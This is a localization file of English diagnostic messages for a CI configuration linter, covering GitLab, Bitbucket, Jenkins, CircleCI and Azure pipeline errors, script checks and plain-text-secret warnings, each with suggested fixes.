include-must-contain-one-of = An include must contain one of the keys: local, project (+ file), remote, template, component.
include-project-without-file = include project without file
including-from-another-project-requires = Including from another project requires file.
network-includes-not-checked = Network includes not checked: { $a0 }
if-such-file-is-unavailable = If such a file is unavailable or has an error, GitLab won't create the pipeline.
these-files-are-outside-repository = { $a0 }{ $a1 } — these files are outside the repository and can't be checked offline; their jobs aren't included in the check.
check-merged-configuration-in-gitlab = Check the merged configuration in GitLab: CI/CD → Editor → Full configuration (or Validate).
is-defined-in-several-files = { $a0 } is defined in several files
final-job-is-merge-of = The final job is a merge of the definitions: keys from { $a0 } override keys from { $a1 }; lists (script, rules) are replaced entirely.
main-file = the main file
thats-how-include-works-jobs = That's how include works: jobs with the same name are merged.
if-this-is-intended-all = If this is intended, all is fine; otherwise rename one of the jobs.
workflow-must-be-map = workflow must be a map
workflow-contains-rules-name-auto = workflow contains rules / name / auto_cancel.
workflow-unknown-key = workflow: unknown key { $a0 }
remove-or-rename-key = Remove or rename the key.

## crates/gorynych-ci-linter/src/check/gitlab/rules.rs

variable-will-be-empty = The variable will be empty: { $a0 }.
command-will-get-empty-string = the command will get an empty string
condition-will-never-work-as = the condition will never work as intended
no-longer-exists = ${ $a0 } no longer exists
ci-build-variables-were-removed = CI_BUILD_* variables were removed in GitLab 9.0; it's now ${ $a0 }.
replace-with = Replace with ${ $a0 }.
theres-no-such-predefined-variable = ${ $a0 } — there's no such predefined variable
there-will-be-no-error-but = There will be no error, but an empty string will be in place of the variable.
there-will-be-no-error-but-variable = There will be no error, but the variable is always empty — the condition will behave as if it doesn't exist.
looks-like-typo-theres = Looks like a typo: there's ${ $a0 }.
names-with-ci-gitlab-are = Names with CI_ / GITLAB_ are reserved by GitLab, and this isn't one of them (if it's a variable from the project settings, all is fine).
check-name = Check the name.
rules-must-be-list = { $a0 }: rules must be a list
each-rule-is-separate-list = Each rule is a separate list item, starting with "- ".
string-2 = string { $a0 }
rule-isnt-map = { $a0 }: rule { $a1 } isn't a map
rule-is-currently = The rule is currently { $a0 }.
works-only-in-job-rules = {" "}{ $a0 } works only in job rules.
rule-has-unknown-key = { $a0 }: rule { $a1 } has an unknown key { $a2 }
fix-or-remove-key = Fix or remove the key.
only-always-and-never-are = Only always and never are allowed in workflow:rules.
rule-when = { $a0 }: rule { $a1 }: when: { $a2 }
rule-delayed-without-start-in = { $a0 }: rule { $a1 }: delayed without start_in
delay-must-be-specified = A delay must be specified.
error-in-condition = { $a0 }: error in condition { $a1 }
example-if-ci-commit-branch = Example: if: '$CI_COMMIT_BRANCH == "main" && $CI_PIPELINE_SOURCE == "push"'
rule-if-must-be-string = { $a0 }: rule { $a1 }: if must be a string
yaml-read-value-as = YAML read the value as { $a0 }.
quote-expression-if-var-x = Quote the expression: if: '$VAR == "x"'
rule-exists-no-such-files = { $a0 }: rule { $a1 }: exists — no such files
rule-will-never-fire-until = The rule will never fire until such files appear in the repository.
no-repository-file-matches = No repository file matches { $a0 }.
check-path-pattern-from-repository = Check the path/pattern (from the repository root, letter case).
rule-changes-unknown-key = { $a0 }: rule { $a1 }: changes — unknown key { $a2 }
allowed-paths-and-compare-to = Allowed: paths and compare_to.
rule-changes-no-such-files = { $a0 }: rule { $a1 }: changes — no such files right now
on-push-and-in-merge = On push and in merge requests
rule-wont-fire-on-regular = The rule won't fire on regular changes (only if such files are added).
no-file-currently-matches = No file currently matches { $a0 }.
check-pattern-src-all-files = Check the pattern: "src/**/*" — all files in src, "*.md" — only in the root.
rule-is-never-checked = { $a0 }: rule { $a1 } is never checked
there-will-be-no-error-but-this = There will be no error, but this rule has no effect.
rule-has-no-conditions-and = Rule { $a0 } has no conditions and always fires, and GitLab takes the first matching rule.
move-rule-without-conditions-to = Move the rule without conditions to the end of the list.
all-rules-are-when-never = { $a0 }: all rules are when: never
job-wont-be-in-any-pipeline = The job won't be in any pipeline.
if-no-rule-includes-job = If no rule includes the job, it's excluded; here all rules only exclude.
add-rule-when-on-success = Add the rule "- when: on_success" (or the right condition) at the end.
workflow-rules-all-rules-are = workflow:rules: all rules are when: never
pipeline-will-never-be-created = A pipeline will never be created.
if-no-workflow-rule-fires = If no workflow rule fires with when: always, the pipeline isn't created.
add-when-always-at-end = Add "- when: always" at the end or a rule with the right condition.
condition = The condition { $a0 }.
will-never-be-true = will never be true
will-always-be-true = will always be true
possible-values = Possible values: { $a0 }…{ $a1 }
check-value = Check the value.
replace-with-2 = Replace with "{ $a0 }".
ci-pipeline-source-is-never = { $a0 }: CI_PIPELINE_SOURCE is never { $a1 }
branch-isnt-in-repository = { $a0 }: branch { $a1 } isn't in the repository
condition-with-will-never-fire = The condition with { $a0 } will never fire — the main branch here is { $a1 }.
condition-will-fire-only-when = The condition will fire only when branch { $a0 } appears.
is-compared-with-and-repository = ${ $a0 } is compared with { $a1 }, and the repository has { $a2 }.
main-branch-is = the main branch is { $a0 }
no-such-branch-neither-local = no such branch (neither local nor on the remote server)
use-ci-default-branch-instead = Use $CI_DEFAULT_BRANCH instead of "{ $a0 }" — then the condition doesn't depend on the branch name.
if-its-typo-fix-it = If it's a typo, fix it; for the main branch $CI_DEFAULT_BRANCH is better.
fix-key-or-better-switch = Fix the key (or better, switch to rules).
error-in-variables = { $a0 }: error in { $a1 }:variables { $a2 }
example-ci-commit-message-deploy = Example: - $CI_COMMIT_MESSAGE =~ /deploy/
is-branch-name-not = { $a0 }: { $a1 }: { $a2 } is a branch name, not { $a3 }
gitlab-will-read-as-branch = GitLab will read { $a0 } as a branch or tag name and { $a1 }.
will-run-job-only-for = will run the job only for it
will-exclude-only-it = will exclude only it
keyword-is-written = The keyword is written { $a0 }.
replace-with-3 = Replace with { $a0 }.

## crates/gorynych-ci-linter/src/check/gitlab/simulate.rs

changed-files-changes = changed files (changes)
no-workflow-rules-rule-matched = no workflow:rules rule matched
workflow-rules-rule-when-never = workflow:rules, rule { $a0 }: when: never
no-rules-rule-matched = no rules rule matched
rule-when-never = rule { $a0 }: when: never
rule = rule { $a0 }
doesnt-match-only = doesn't match only
without-rules-job-runs-by = without rules a job runs by default only for branches and tags (only: branches, tags)
excluded-by-except = excluded by except
matches-only = matches only
no-conditions = no conditions
no-job-matched-conditions = no job matched the conditions
there-are-only-pre-post = there are only .pre/.post stage jobs
workflow-rules-rule = workflow:rules, rule { $a0 }
there-are-matching-jobs = there are matching jobs
pipeline-wont-be-created = { $a0 }: the pipeline won't be created
on-run-pipeline-gitlab-will = On "Run pipeline" GitLab will respond: "Pipeline will not run for the selected trigger. The rules configuration prevented any jobs from being added to the pipeline."
pipeline-just-wont-appear = The pipeline just won't appear.
if-manual-run-is-needed = If a manual run is needed, add a rule: - if: $CI_PIPELINE_SOURCE == "web"
check-job-rules = Check the job rules.
jobs-without-rules-get-into = {" "}(jobs without rules get into an MR pipeline only if workflow:rules allows it)
is-in-pipeline-and-isnt = { $a0 } is in the pipeline ({ $a1 }), and { $a2 } isn't ({ $a3 }).
excluded = excluded
waits-for-which-wont-exist = { $a0 }: { $a1 } waits for { $a2 }, which won't exist
gitlab-wont-create-pipeline = GitLab won't create the pipeline: "{ $a0 }"
make-conditions-of-and-same =
    Make the conditions of { $a0 } and { $a1 } the same or add optional: true:
    needs:
    {"  "}- job: { $a2 }
    {"    "}optional: true
takes-artifacts-from-which-wont = { $a0 }: { $a1 } takes artifacts from { $a2 }, which won't exist
gitlab-wont-create-pipeline-job = GitLab won't create the pipeline: "{ $a0 } job: undefined dependency: { $a1 }"
is-excluded-in-this-pipeline = { $a0 } is excluded in this pipeline ({ $a1 }).
align-job-conditions-or-remove = Align the job conditions or remove the dependency.
stop-job-isnt-in-pipeline = { $a0 }: stop job { $a1 } isn't in the pipeline
gitlab-wont-create-pipeline-job-on = GitLab won't create the pipeline: "{ $a0 } job: on_stop job { $a1 } is not defined"
is-in-pipeline-and-isnt-2 = { $a0 } is in the pipeline, and { $a1 } isn't.
give-same-rules-as-with = Give { $a0 } the same rules as { $a1 } (with when: manual).
creates-release-without-tag = { $a0 }: { $a1 } creates a release without a tag
job-will-fail-ci-commit = The job will fail: $CI_COMMIT_TAG is empty — "tag_name is missing" / "release tag name can't be blank".
job-with-release-tag-name = A job with release: tag_name: $CI_COMMIT_TAG gets into a pipeline without a tag.
jobs-wont-start-until-then = ; jobs { $a0 } won't start until then
is-manual-and-blocking = { $a0 } is manual and blocking
pipeline-will-stop-in-blocked = The pipeline will stop in "blocked" status and wait for ▶{ $a0 } to be clicked.
for-when-manual-inside-rules = For when: manual inside rules, allow_failure defaults to false (unlike when: manual on the job itself).
allow-failure-false-on-manual = allow_failure: false on a manual job.
if-no-waiting-is-needed = If no waiting is needed, add allow_failure: true next to when: manual.
push-to = Push to { $a0 }
tag-v1-0-0 = Tag v1.0.0
schedule = Schedule ({ $a0 })
manual-run = Manual run ({ $a0 })
push-to-with-open-mr = Push to { $a0 } with an open MR
duplicate-pipelines-for-branch-and = Duplicate pipelines: for the branch and for the merge request
on-every-push-to-branch = On every push to a branch with an open merge request
two-pipelines-will-run-for = Two pipelines will run for one commit: "branch" ({ $a0 } set.) and "merge request" ({ $a1 } set.) — runners are twice as busy, and the MR status may depend on either of them.
rules-allow-both-push-pipelines = The rules allow both push pipelines for any branch and merge request pipelines, and the condition "if an MR is already open, don't create the branch pipeline" isn't set.
nothing-runs-when-merge-request = Nothing runs when a merge request is open
on-push-to-branch-with = On push to a branch with an open merge request
branch-pipeline-isnt-created-and = The branch pipeline isn't created ({ $a0 }), and the merge request pipeline is empty ({ $a1 }) — changes go through without checks.
rules-forbid-branch-pipeline-when = The rules forbid the branch pipeline when an MR is open, but the jobs aren't set up for MR pipelines.
add-rule-if-ci-pipeline = Add the rule - if: $CI_PIPELINE_SOURCE == "merge_request_event" to the jobs or allow MRs in workflow:rules.
no-pipeline-is-created-on = No pipeline is created on push, for MRs or for tags
on-push-merge-request-and = On push, merge request and tag
nothing-will-run-gitlab-will = Nothing will run — GitLab will silently not create the pipeline.
check-workflow-rules-and-job = Check workflow:rules and the job rules.
rules-only-conditions-arent-met = The rules/only conditions aren't met.
isnt-in-any-typical-pipeline = { $a0 } isn't in any typical pipeline
job-wont-run-on-push = The job won't run on push, MR, tag, schedule or manual run.
if-job-runs-via-api = If the job runs via API/trigger or a special variable, all is fine; otherwise check the conditions.

## crates/gorynych-ci-linter/src/check/gitlab/values.rs

variables-must-be-set-of-name = { $a0 }: variables must be a set of "NAME: value"
its-currently-list-with = It's currently a list (with "- ").
its-currently-not-map = It's currently not a map.
variable-name-isnt-usable-in = Variable name { $a0 } isn't usable in the shell
when-jobs-run-2 = When jobs run
wont-expand-in-script-shell = ${ $a0 } won't expand in the script (the shell doesn't allow { $a1 } in a name).
hyphen = a hyphen
character = the character
environment-variable-names-are-latin = Environment variable names are Latin letters, digits and "_", not starting with a digit.
rename-it-for-example-to = Rename it, for example to { $a0 }.
unquoted-boolean = { $a0 }: { $a1 } — an unquoted boolean
variable-values-are-strings-yaml = Variable values are strings; YAML read true/false/yes/no as a boolean.
value-is-list = { $a0 }: the value is a list
variable-cant-be-list = A variable can't be a list.
allowed-value-description-options-expand = Allowed: value, description, options, expand.
value-isnt-in-options = { $a0 }: value { $a1 } isn't in options
add-value-to-options-or = Add the value to options or fix value.
options-in-job-variable = { $a0 }: options in a job variable
options-only-work-for-global = options only work for global variables (the manual run form).
they-do-nothing-here = They do nothing here.
move-variable-to-global-variables = Move the variable to the global variables.
in-plain-text-in-file = { $a0 }: { $a1 } in plain text in the file
anyone-with-access-to-repository = Anyone with access to the repository (or a copy of it) gets this key; the value isn't hidden in job logs either.
variables-from-gitlab-ci-yml = Variables from .gitlab-ci.yml aren't masked or protected.
revoke-key-create-new-one = Revoke the key, create a new one and save it in Settings → CI/CD → Variables (Masked, Protected); leave only the name in the file.
looks-like-plain-text-secret = { $a0 }: looks like a plain-text secret
value-is-visible-to-anyone = The value is visible to anyone with access to the repository and isn't masked in logs.
name-looks-like-password-token = The name { $a0 } looks like a password/token, and the value is set right in the file.
move-value-to-settings-ci = Move the value to Settings → CI/CD → Variables (Masked) and remove it from the file.
when-each-job-with-this = When each job with this image runs
empty = { $a0 }: empty { $a1 }
image-name-isnt-set = The image name isn't set.
space-in-image-name = { $a0 }: space in image name { $a1 }
job-will-fail-invalid-reference = The job will fail: "invalid reference format".
image-name-cant-contain-spaces = An image name can't contain spaces.
depends-on = { $a0 }: { $a1 } { $a2 } depends on ${ $a3 }
if-isnt-set-in-project = If ${ $a0 } isn't set in the project settings, the job will fail: "invalid reference format" or "pull access denied".
variable-isnt-declared-in-file = The variable isn't declared in the file.
declare-default-value-in-variables = Declare a default value in variables: { $a0 }: …
uppercase-letters-in-image-name = { $a0 }: uppercase letters in image name { $a1 }
job-will-fail-invalid-reference-format = The job will fail: "invalid reference format: repository name must be lowercase".
docker-image-names-are-lowercase = Docker image names are lowercase only.
without-version-2 = { $a0 }: { $a1 } { $a2 } without a version
it-works-today-but-job = It works today, but the job may suddenly break after a new image version is released.
without-tag-latest-is-used = Without a tag :latest is used — it changes over time.
specify-version-version = Specify a version: { $a0 }:<version>
image = image
image-unknown-key = { $a0 }: image — unknown key { $a1 }
allowed-name-entrypoint-docker-pull = Allowed: name, entrypoint, docker, pull_policy, kubernetes.
image-has-no-name = { $a0 }: image has no name
image-must-be-specified = An image must be specified.
image-must-be-string = { $a0 }: image must be a string
artifacts-must-be-map = { $a0 }: artifacts must be a map
artifacts-contains-paths-expire-in = artifacts contains paths, expire_in, etc.
artifacts-unknown-key = { $a0 }: artifacts — unknown key { $a1 }
artifacts-paths-must-be-list = { $a0 }: artifacts:paths must be a list
even-single-path-is-written = Even a single path is written as a list.
artifact-path-is-outside-project = { $a0 }: artifact path { $a1 } is outside the project folder
at-end-of-job = At the end of job { $a0 }
files-wont-be-saved-warning = The files won't be saved: "WARNING: { $a0 }: not supported: outside build directory" and "ERROR: No files to upload".
artifacts-can-only-be-taken-inside = Artifacts can only be taken inside $CI_PROJECT_DIR.
copy-files-into-project-folder = Copy the files into the project folder and use a relative path.
artifacts-doesnt-say-what-to = { $a0 }: artifacts doesn't say what to save
runner-wont-upload-anything-warning = The runner won't upload anything: "WARNING: No files to upload".
there-are-no-paths-reports = There are no paths, reports or untracked.
cant-parse-expire-in = { $a0 }: can't parse expire_in: { $a1 }
written-as-1-week-30 = Written as "1 week", "30 days" or "never".
report-is-no-longer-supported = { $a0 }: report { $a1 } is no longer supported
report-type-was-removed-from = The report type was removed from GitLab.
use = Use { $a0 }.
unknown-report-type = { $a0 }: unknown report type { $a1 }
unknown-type = Unknown type.{ $a0 }
check-report-name = Check the report name.
coverage-report-without-coverage-format = { $a0 }: coverage_report without coverage_format/path
both-keys-are-required = Both keys are required.
cobertura-and-jacoco-are-supported = cobertura and jacoco are supported.
more-than-4-caches = { $a0 }: more than 4 caches
merge-caches = Merge the caches.
cache-must-be-map = { $a0 }: cache must be a map
cache-contains-key-paths-policy = cache contains key, paths, policy.
cache-unknown-key = { $a0 }: cache — unknown key { $a1 }
cache-key-contains-or-is = { $a0 }: cache:key contains "/" or is "."
cache-key-becomes-part-of = The cache key becomes part of a file name.
use-ci-commit-ref-slug = Use $CI_COMMIT_REF_SLUG instead of $CI_COMMIT_REF_NAME (it has no "/").
cache-key-with-branch-name = { $a0 }: cache:key with a branch name
in-branches-with-in-name = In branches with "/" in the name (feature/x)
cache-wont-be-saved-branch = The cache won't be saved: a branch name with a slash isn't allowed in the key.
ci-commit-ref-name-may = $CI_COMMIT_REF_NAME may contain "/".
use-ci-commit-ref-slug-2 = Use $CI_COMMIT_REF_SLUG.
more-than-two-cache-key = { $a0 }: more than two cache:key:files
key-can-be-built-from = The key can be built from at most two files.
keep-1-2-files-usually = Keep 1–2 files (usually the lock file).
cache-key-files-no-file = { $a0 }: cache:key:files — no file { $a1 }
cache-will-be-shared-under = The cache will be shared under the "default" key for all branches and won't reset when dependencies change.
file-isnt-in-repository-2 = File { $a0 } isn't in the repository.
specify-existing-lock-file = Specify an existing lock file.
cache-key-unknown-key = { $a0 }: cache:key — unknown key { $a1 }
allowed-files-and-prefix = Allowed: files and prefix.
unknown-value-2 = Unknown value.
cache-paths-must-be-list = { $a0 }: cache:paths must be a list
cache-doesnt-say-what-to = { $a0 }: cache doesn't say what to cache
cache-wont-be-created-runner = The cache won't be created: the runner will skip the cache save step.
there-are-no-paths-or = There are no paths or untracked.
cache-path-is-outside-project = { $a0 }: cache path { $a1 } is outside the project folder
warning-not-supported-outside-build = "WARNING: { $a0 }: not supported: outside build directory" — the path won't get into the cache.
only-paths-inside-project-folder = Only paths inside the project folder can be cached.
move-cache-inside-project-for = Move the cache inside the project (for example, npm_config_cache: .npm).
environment-must-be-string-or = { $a0 }: environment must be a string or a map
set-environment-name = Set the environment name.
environment-unknown-key = { $a0 }: environment — unknown key { $a1 }
environment-has-no-name = { $a0 }: the environment has no name
environment-is-identified-by-its = An environment is identified by its name.
invalid-environment-name = { $a0 }: invalid environment name { $a1 }
name-contains-forbidden-characters = The name contains forbidden characters.
for-example-review-ci-commit = For example: review/$CI_COMMIT_REF_SLUG
environment-url-isnt-address = { $a0 }: environment:url { $a1 } isn't an address
url-must-start-with-http = The URL must start with http:// or https://.
cant-parse-auto-stop-in = { $a0 }: can't parse auto_stop_in: { $a1 }
written-as-1-week-2 = Written as "1 week", "2 days".
on-stop-refers-to-nonexistent = { $a0 }: on_stop refers to a nonexistent { $a1 }
add-environment-stop-job-or = Add an environment stop job or fix the name.
no-environment-action-stop = { $a0 }: no environment:action: stop
is-listed-in-on-stop = { $a0 } is listed in on_stop of { $a1 }, so it must stop the environment.
different-environment-name = { $a0 }: different environment name
environment-is-and-has = Environment { $a0 } is { $a1 }, and { $a2 } has { $a3 }.
use-one-name = Use one name: { $a0 }.
will-run-automatically = { $a0 } will run automatically
in-every-pipeline-with-this = In every pipeline with this job
environment-will-be-stopped-right = The environment will be stopped right after deployment.
stop-job-without-when-manual = A stop job without when: manual runs as a regular one.

## crates/gorynych-ci-linter/src/check/mod.rs

yaml-syntax-error = YAML syntax error: { $a0 }
right-on-push-file-cant = Right on push — the file can't be read
ci-server-wont-be-able = The CI server won't be able to read the file and won't run any jobs.
file-will-be-read-but = The file will be read, but possibly not as intended.
yaml-structure-is-broken-indentation = The YAML structure is broken: indentation, colons, quotes, or tabs instead of spaces.
ambiguous-yaml-entry = Ambiguous YAML entry.
check-indentation-spaces-only-same = Check the indentation (spaces only, the same count per level) and the quotes around strings with ": " or "#".
check-was-interrupted = The check was interrupted
some-checks-werent-run = Some checks weren't run.
report-bug-configuration-check-shouldnt = Report the bug — the configuration check shouldn't crash.
pipeline-diagram-may-be-incomplete = The pipeline diagram may be incomplete.
check-file = Check the file.

## crates/gorynych-ci-linter/src/check/other.rs

bitbucket-wont-run-pipeline = Bitbucket won't run the pipeline: "Configuration error: { $a0 }".
parallel-with-one-step = { $a0 }: parallel with one step
there-will-be-no-error-but-no = There will be no error, but no parallelism either.
parallel-needs-at-least-two = parallel needs at least two steps.
remove-parallel-or-add-steps = Remove parallel or add steps.
item-without-step = { $a0 }: item without step
pipeline-item-is-step-parallel = A pipeline item is step, parallel or stage.
no-script-2 = { $a0 }: { $a1 } — no script
step-has-nothing-to-run = The step has nothing to run.
empty-script-2 = { $a0 }: { $a1 } — empty script
at-least-one-command-is = At least one command is required.
add-command = Add a command.
from-1-to-120-minutes = From 1 to 120 minutes is allowed.
allowed-4 = Allowed: { $a0 }.
allowed-manual-and-automatic = Allowed: manual and automatic.
built-in-caches-custom-ones = Built-in caches: { $a0 }; custom ones must be described in definitions.caches.{ $a1 }
unknown-cache = { $a0 }: { $a1 } — unknown cache { $a2 }
definitions-caches-path-to-folder =
    definitions:
    {"  "}caches:
    {"    "}{ $a0 }: path/to/folder
service-isnt-defined = { $a0 }: { $a1 } — service { $a2 } isn't defined
services-except-docker-are-defined = Services (except docker) are defined in definitions.services.
environment-is-used-twice = { $a0 }: environment { $a1 } is used twice
in-one-pipeline-each-environment = In one pipeline each environment is deployed by one step.
use-different-environments-or-merge = Use different environments or merge the steps.
docker-without-services-docker = { $a0 }: { $a1 } — docker without services: [docker]
when-step-runs = When step { $a0 } runs
step-will-fail-cannot-connect = The step will fail: "Cannot connect to the Docker daemon at unix:///var/run/docker.sock" (or "docker: command not found").
docker-in-bitbucket-pipelines-is = Docker in Bitbucket Pipelines is only available as a service.
step-3 = step
right-on-push-bitbucket-checks = Right on push — Bitbucket checks bitbucket-pipelines.yml before running
no-pipelines-section = No pipelines section
without-pipelines-bitbucket-doesnt-know = Without pipelines, Bitbucket doesn't know what to run.
options-max-time-more-than = options: max-time { $a0 } — more than 120 minutes
step-in-bitbucket-cloud-is = A step in Bitbucket Cloud is limited to 120 minutes.
pipelines-unknown-section = pipelines: unknown section { $a0 }
allowed-default-branches-tags-bookmarks = Allowed: default, branches, tags, bookmarks, pull-requests, custom.{ $a0 }
fix-section-name = Fix the section name.
must-be-list-of-steps = { $a0 }: must be a list of steps
pipeline-is-list-of-step = A pipeline is a list of "- step: …".
first-step-cant-be-manual = { $a0 }: the first step can't be manual
pipeline-starts-automatically-and-so = The pipeline starts automatically, and so does the first step.
remove-trigger-manual-from-first = Remove trigger: manual from the first step (or make the pipeline custom).
build-will-fail-right-away = The build will fail right away with a parse error: "org.codehaus.groovy.control.MultipleCompilationErrorsException: startup failed: WorkflowScript: { $a0 }".
when-build-starts-jenkins-parses = When the build starts — Jenkins parses the Jenkinsfile first
expected-closing-one-for-from = Expected a closing one for "{ $a0 }" from line { $a1 }.
it-has-no-opening-bracket = It has no opening bracket.
extra-on-line = Extra "{ $a0 }" on line { $a1 }
check-that-brackets-are-paired = Check that the brackets are paired.
unclosed-string = Unclosed string { $a0 }
quote-somewhere-has-no-pair = A quote somewhere has no pair.
check-quotes = Check the quotes.
unclosed-from-line = Unclosed "{ $a0 }" from line { $a1 }
file-ended-before-all-blocks = The file ended before all blocks were closed.
add-missing-bracket = Add the missing bracket.
pipeline-has-no-agent = pipeline has no agent
declarative-pipeline-must-say-where = A declarative pipeline must say where to run.
pipeline-has-no-stages = pipeline has no stages
stages-are-required = Stages are required.
stage-declared-twice-2 = Stage { $a0 } declared twice
first-time-on-line = The first time — on line { $a0 }.
rename-one-of-stages = Rename one of the stages.
stage-without-steps = Stage { $a0 } without steps
stage-has-nothing-to-run = The stage has nothing to run.
stage-at-once = Stage { $a0 }: { $a1 } at once
and = {" "}and{" "}
only-one-is-allowed = Only one is allowed.
split-them-into-nested-stages = Split them into nested stages.
post-unknown-condition = post: unknown condition { $a0 }
unknown-condition = Unknown condition.{ $a0 }
fix-condition = Fix the condition.
neither-pipeline-nor-node-found = Neither pipeline {"{"} {"}"} nor node {"{"} {"}"} found
jenkins-will-run-file-as = Jenkins will run the file as a Groovy script — most likely nothing will be built.
jenkinsfile-starts-with-pipeline = A Jenkinsfile starts with pipeline {"{"} … {"}"} (declarative) or node {"{"} … {"}"} (scripted).
in-plain-text-in-jenkinsfile = { $a0 } in plain text in the Jenkinsfile
secrets-must-be-stored-in-jenkins = Secrets must be stored in Jenkins Credentials.
revoke-key-use-withcredentials-string = Revoke the key; use withCredentials([string(credentialsId: '…', variable: 'TOKEN')]) {"{"} … {"}"}
build = build
right-on-push-circleci-checks = Right on push — CircleCI checks config.yml before running
version-isnt-specified = version isn't specified
circleci-wont-run-build-config = CircleCI won't run the build: "Config does not conform to schema: missing required property version".
first-line-of-configuration-is = The first line of the configuration is the version.
job-isnt-defined = { $a0 }: job { $a1 } isn't defined
circleci-wont-run-workflow-job = CircleCI won't run the workflow: "Job '{ $a0 }' not found".
jobs-has-no = jobs has no { $a0 }.{ $a1 }
fix-name-or-define-job = Fix the name or define the job.
orb-isnt-included = { $a0 }: orb { $a1 } isn't included
circleci-wont-run-workflow-cannot = CircleCI won't run the workflow: "Cannot find a definition for job named { $a0 }".
orb-must-be-declared-in = The orb must be declared in the orbs section.
waits-for-which-isnt-in = { $a0 }: { $a1 } waits for { $a2 }, which isn't in the workflow
circleci-wont-run-workflow-job-requires = CircleCI won't run the workflow: "Job '{ $a0 }' requires '{ $a1 }', which is the name of 0 other jobs in workflow '{ $a2 }'".
workflow-has-no-job = Workflow { $a0 } has no job { $a1 }.{ $a2 }
fix-name-2 = Fix the name.
no-executor-specified = { $a0 }: no executor specified
circleci-wont-run-job-job = CircleCI won't run the job: "Job '{ $a0 }' has no executor (docker, machine, macos or executor)".
job-needs-execution-environment = The job needs an execution environment.
circleci-wont-run-job-steps = CircleCI won't run the job: "steps is required".
no-checkout-step = { $a0 }: no checkout step
commands-will-fail-there-are = The commands will fail: there are no repository files in the container.
code-appears-only-after-checkout = The code appears only after the checkout step.
right-on-push-azure-devops = Right on push — Azure DevOps checks the file before running
dependson-on-unknown = { $a0 }: dependsOn on an unknown { $a1 }
azure-wont-run-pipeline-job = Azure won't run the pipeline: "Job { $a0 } depends on unknown job { $a1 }".
stage-dependson-on-unknown = Stage { $a0 }: dependsOn on an unknown { $a1 }
azure-wont-run-pipeline-stage = Azure won't run the pipeline: "Stage { $a0 } depends on unknown stage { $a1 }".
theres-no-stage = There's no stage { $a0 }.{ $a1 }
pool-isnt-specified = pool isn't specified
projects-default-pool-will-be = The project's default pool will be used — if it has no agents, the job will wait forever.
pool-isnt-set-in-file = pool isn't set in the file or in the jobs.

## crates/gorynych-ci-linter/src/check/scripts.rs

job-2 = job { $a0 }
when-runs = When { $a0 } { $a1 } runs
jobs = jobs
script-of-has-in-plain = The script of { $a0 } has { $a1 } in plain text
value-will-end-up-in = The value will end up in Git history and in job logs — anyone with access to the repository or the logs will see it.
secrets-in-ci-file-arent = Secrets in a CI file aren't hidden: only variables from the project settings are masked.
revoke-this-key-token-and = Revoke this key/token and create a new one; store it in a protected variable (Settings → CI/CD → Variables, masked) and use it as $NAME.
cd-no-such-folder-in = cd { $a0 }: no such folder in the repository
job-will-fail-on-this = The job will fail on this line: "{ $a0 }: cd: { $a1 }: No such file or directory".
folder-isnt-among-repository-files = Folder { $a0 } isn't among the repository files, and nothing earlier in the job creates it.
check-path-letter-case-matters = Check the path (letter case matters on Linux) or create the folder earlier (mkdir -p) / get it as an artifact from a previous job.
in-image = { $a0 } in the { $a1 } image
job-will-fail-not-found = The job will fail: "{ $a0 }: { $a1 }: not found".
is-alpine-linux-image-it = { $a0 } is an Alpine Linux image; it has the apk package manager, and no { $a1 }.
use-apk-add-no-cache = Use apk add --no-cache … or a Debian/Ubuntu image (without "-alpine" in the tag).
apk-in-image = apk in the { $a0 } image
job-will-fail-apk-not = The job will fail: "{ $a0 }: apk: not found".
is-based-on-debian-ubuntu = { $a0 } is based on Debian/Ubuntu — it has apt-get, and apk exists only in Alpine.
replace-it-with-apt-get = Replace it with apt-get update && apt-get install -y … or take the "-alpine" variant of the image.
bash-in-image = bash in the { $a0 } image
sh-bash-not-found-alpine = "sh: bash: not found" — Alpine has only sh (ash) by default.
alpine-images-are-minimal-bash = Alpine images are minimal: bash isn't installed in them.
run-it-via-sh-or = Run it via sh or add apk add --no-cache bash before it.
image-has-no = { $a0 }: the { $a1 } image has no { $a2 }
job-will-most-likely-fail = The job will most likely fail: "{ $a0 }: { $a1 }: not found" (code 127).
node-images-have-npm-and = node images have npm and yarn, but pnpm has to be enabled separately.
official-image-doesnt-contain-and = The official { $a0 } image doesn't contain { $a1 }, and the job doesn't install it earlier.
add-corepack-enable-or-npm = Add corepack enable (or npm i -g pnpm) before this.
take-image-with-or-install = Take an image with { $a0 } or install it earlier in the script.
docker-without-docker-daemon = docker { $a0 } without a Docker daemon
on-runner-with-docker-executor = On a runner with the Docker executor the job will fail: "Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?"
job-container-has-only-docker = The job container has only the docker client (if at all), and the daemon itself isn't running: there's no services: docker:dind and DOCKER_HOST isn't set.
add-services-docker-dind-and = Add services: [docker:dind] and variables: DOCKER_TLS_CERTDIR: "/certs" (a docker:… image), or use a runner with the shell executor / docker socket, or kaniko/buildah.
file-isnt-in-repository-3 = { $a0 }: the file isn't in the repository
job-will-fail-not-found-or = The job will fail: "{ $a0 }: { $a1 }: not found" (or No such file or directory).
file-isnt-among-repository-files = File { $a0 } isn't among the repository files, and neither this job nor previous jobs' artifacts create it.
check-path-and-letter-case = Check the path and letter case; if the file is generated, pass it as an artifact (artifacts + needs/dependencies).
file-isnt-executable = { $a0 }: the file isn't executable
job-will-fail-permission-denied = The job will fail: "{ $a0 }: { $a1 }: Permission denied" (code 126).
in-git-file-is-saved = In Git, file { $a0 } is saved without the executable flag (mode 100644) — this happens when it's added on Windows.
run-git-update-index-chmod = Run git update-index --chmod=+x { $a0 } and commit; or run it through an interpreter: sh { $a1 }.
file-isnt-in-repository-4 = { $a0 } { $a1 }: the file isn't in the repository
job-will-fail-error-cannot = The job will fail: "Error: Cannot find module '…/{ $a0 }'".
job-will-fail-cant-open = The job will fail: "can't open file '{ $a0 }': [Errno 2] No such file or directory".
job-will-fail-no-such = The job will fail: "{ $a0 }: No such file or directory".
file-isnt-in-repository-taking = File { $a0 } isn't in the repository (taking previous cd into account).
check-path-and-letter-case-or = Check the path and letter case, or pass the file as an artifact from the job that creates it.
root = the root
no-package-json-in = { $a0 }: no package.json in { $a1 }
will-fail-package-json-not = { $a0 } will fail: package.json not found.
command-runs-in-folder-and = The command runs in folder { $a0 }, and there's no package.json there.
go-to-project-folder-cd = Go to the project folder (cd …) or fix the path.
npm-ci-without-package-lock = npm ci without package-lock.json
has-no-package-lock-json = { $a0 } has no package-lock.json — it wasn't committed (or it's in .gitignore).
commit-package-lock-json-npm = Commit package-lock.json (npm install creates it locally) or replace npm ci with npm install.
